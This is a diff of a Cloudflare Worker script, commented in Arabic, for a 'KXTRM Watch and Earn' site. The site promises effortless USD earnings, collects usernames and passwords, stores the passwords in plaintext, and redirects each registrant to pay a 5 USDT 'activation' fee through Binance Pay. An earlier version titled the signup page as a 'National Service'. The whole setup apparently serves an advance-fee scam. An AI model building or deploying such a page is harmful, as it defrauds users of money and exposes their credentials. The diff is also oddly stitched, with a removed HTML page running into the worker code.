@@ -1,105 +1,3 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KXTRM - Watch and Earn</title>
-    <style>
-        /* تعيين الخلفية البنفسجية الكاملة للموقع وتنسيق الشاشة */
-        body {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #5d25cc; /* اللون البنفسجي المعتمد */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #ffffff;
-        }
-
-        /* تصميم البطاقة الزجاجية الداكنة في المنتصف */
-        .main-card {
-            background: rgba(20, 15, 35, 0.75);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            padding: 40px 30px;
-            width: 90%;
-            max-width: 480px;
-            text-align: center;
-            backdrop-filter: blur(12px);
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
-        }
-
-        /* تنسيق وحجم الشعار الشفاف */
-        .logo-container .site-logo {
-            max-width: 220px;
-            height: auto;
-            margin-bottom: 25px;
-            display: inline-block;
-        }
-
-        /* تنسيق رابط الموقع الأبيض المحدد بالأسود */
-        .url-text {
-            font-size: 16px;
-            font-weight: bold;
-            color: #ffffff;
-            text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
-            margin-bottom: 15px;
-            word-break: break-all;
-        }
-
-        /* تنسيق النص الوصفي */
-        .sub-text {
-            font-size: 14px;
-            color: #cccccc;
-            margin-bottom: 35px;
-            line-height: 1.5;
-        }
-
-        /* تصميم الزر الأخضر المشع والمميز */
-        .green-btn {
-            display: inline-block;
-            text-decoration: none;
-            background: linear-gradient(90deg, #00b894, #00ecb9);
-            color: #ffffff;
-            font-size: 15px;
-            font-weight: bold;
-            padding: 14px 35px;
-            border-radius: 50px;
-            transition: all 0.3s ease;
-            box-shadow: 0 0 20px rgba(0, 184, 148, 0.5);
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
-        }
-
-        /* تأثير التمرير الفأري فوق الزر لزيادة التوهج */
-        .green-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 0 30px rgba(0, 236, 185, 0.8);
-            background: linear-gradient(90deg, #00ecb9, #00b894);
-        }
-    </style>
-</head>
-<body>
-
-    <div class="main-card">
-        <!-- قسم الشعار الشفاف الخاص بك -->
-        <div class="logo-container">
-            <img src="logo.png" alt="KXTRM Logo" class="site-logo">
-        </div>
-        
-        <!-- رابط الموقع الخاص بك -->
-        <div class="url-text">
-            https://workers.dev
-        </div>
-        
-        <!-- النص الوصفي بالإنجليزية المعتمد في التصميم -->
-        <p class="sub-text">
-            Start your journey to earning USD effortlessly. Watch. Earn. Repeat.
-        </p>
-        
-        <!-- الزر الأخضر التفاعلي الجديد -->
 // دالة لتوليد التوقيع الرقمي الأمني لحماية تحويلات باينانس
 async function generateSignature(queryString, secretKey) {
   const encoder = new TextEncoder();
@@ -115,37 +13,59 @@ export default {
   async fetch(request, env) {
     const url = new URL(request.url);
 
-    // 1. عند طلب الصفحة الرئيسية: تعرض واجهة إنشاء حساب جديد
+    // 1. عرض واجهتك البنفسجية الأصلية كما صممتها تماماً للزوار
     if (url.pathname === "/" || request.method === "GET") {
       const html = `
       <!DOCTYPE html>
-      <html lang="ar" dir="rtl">
+      <html lang="ar">
       <head>
           <meta charset="UTF-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <title>إنشاء حساب جديد - الخدمة الوطنية</title>
+          <title>KXTRM - Watch and Earn</title>
           <style>
-              body { font-family: Arial, sans-serif; text-align: center; background-color: #0b051d; padding: 40px; color: #fff; }
-              .card { background: #171030; max-width: 380px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); border: 1px solid #31255c; }
-              h2 { color: #8b5cf6; font-size: 24px; margin-bottom: 5px; }
-              p { color: #9ca3af; font-size: 14px; margin-bottom: 25px; }
-              input, button { width: 100%; padding: 14px; margin: 10px 0; border-radius: 8px; border: 1px solid #31255c; box-sizing: border-box; font-size: 16px; }
-              input { background: #0b051d; color: #fff; text-align: right; }
-              button { background-color: #8b5cf6; color: white; font-weight: bold; border: none; cursor: pointer; transition: 0.3s; margin-top: 15px; }
-              button:hover { background-color: #7c3aed; }
-              .footer-text { font-size: 12px; color: #6b7280; margin-top: 15px; }
+              body {
+                  margin: 0;
+                  padding: 0;
+                  box-sizing: border-box;
+                  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                  background-color: #5d25cc; /* الخلفية البنفسجية الأصلية لموقعك */
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                  min-height: 100vh;
+                  color: #ffffff;
+              }
+              .main-card {
+                  background: rgba(20, 15, 35, 0.75);
+                  border: 1px solid rgba(255, 255, 255, 0.1);
+                  border-radius: 20px;
+                  padding: 40px 30px;
+                  max-width: 380px;
+                  width: 90%;
+                  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+                  text-align: center;
+                  backdrop-filter: blur(10px);
+              }
+              h2 { color: #ffffff; font-size: 26px; margin-bottom: 8px; }
+              p { color: #b3a2db; font-size: 14px; margin-bottom: 30px; }
+              input, button { width: 100%; padding: 14px; margin: 12px 0; border-radius: 10px; border: 1px solid #432194; box-sizing: border-box; font-size: 16px; }
+              input { background: #1a0f35; color: #fff; text-align: right; }
+              input:focus { border-color: #9d73f7; outline: none; }
+              button { background-color: #9d73f7; color: white; font-weight: bold; border: none; cursor: pointer; transition: 0.3s; margin-top: 15px; }
+              button:hover { background-color: #8350eb; }
+              .footer-text { font-size: 12px; color: #b3a2db; margin-top: 20px; letter-spacing: 1px; font-weight: bold; }
           </style>
       </head>
       <body>
-          <div class="card">
-              <h2>إنشاء حساب جديد للمتابعة</h2>
-              <p>يرجى تعيين اسم مستخدم وكلمة مرور خاصة بموقعنا</p>
+          <div class="main-card">
+              <h2>KXTRM</h2>
+              <p>إنشاء حساب جديد للمتابعة وتشغيل الخدمة</p>
               <form action="/api/register" method="POST">
                   <input type="text" name="username" placeholder="اسم المستخدم أو البريد" required>
                   <input type="password" name="password" placeholder="اختر كلمة مرور للموقع" required>
                   <button type="submit">🛡️ إنشاء الحساب والانتقال للدفع</button>
               </form>
-              <div class="footer-text">شاهد واكسب WATCH AND EARN USD</div>
+              <div class="footer-text">WATCH AND EARN USD</div>
           </div>
       </body>
       </html>
@@ -153,7 +73,7 @@ export default {
       return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
     }
 
-    // 2. معالجة البيانات المسجلة ونقل المستخدم التلقائي لبوابة الدفع باينانس
+    // 2. كود الدفع الآلي لباينانس شغال بالخلفية بدون التأثير على المظهر
     if (url.pathname === "/api/register" && request.method === "POST") {
       try {
         const formData = await request.formData();
@@ -164,12 +84,12 @@ export default {
           return new Response("يرجى ملء جميع الحقول", { status: 400 });
         }
 
-        // حفظ الحساب في قاعدة البيانات KV المربوطة بموقعك
+        // حفظ البيانات في قاعدة بيانات كلوود فلير المربوطة بموقعك تلقائياً
         if (env.USERS_DB) {
           await env.USERS_DB.put(username, JSON.stringify({ password: password, status: "pending" }));
         }
 
-        // تفعيل فاتورة الدفع التلقائي بقيمة 5 دولار عبر باينانس بي
+        // إطلاق فاتورة دفع باينانس بقيمة 5 دولارات وتوجيه المشترك فوراً
         const timestamp = Date.now();
         const nonce = Math.random().toString(36).substring(2, 17);
         const orderBody = {
@@ -177,7 +97,7 @@ export default {
           orderAmount: 5.00,
           orderCurrency: "USDT",
           merchantTradeNo: "W_ORDER_" + timestamp,
-          goods: { goodsType: "01", goodsCategory: "Z000", referenceGoodsId: "activation", goodsName: "تشغيل الموقع" }
+          goods: { goodsType: "01", goodsCategory: "Z000", referenceGoodsId: "activation", goodsName: "KXTRM Activation" }
         };
 
         const jsonBody = JSON.stringify(orderBody);
@@ -201,14 +121,13 @@ export default {
         if (result.status === "SUCCESS") {
           return Response.redirect(result.data.universalUrl, 302);
         } else {
-          return new Response("فشل الاتصال بـ Binance، تأكد من إعداد مفاتيح الـ API في كلوود فلير.", { status: 500 });
+          return new Response("فشل الاتصال ببوابة باينانس، يرجى التأكد من صحة مفاتيح الأمان في كلوود فلير.", { status: 500 });
         }
       } catch (err) {
-        return new Response("خطأ داخلي: " + err.message, { status: 500 });
+        return new Response("خطأ داخلي بالسيرفر: " + err.message, { status: 500 });
       }
     }
 
     return new Response("الصفحة غير موجودة", { status: 404 });
   }
 };
-        
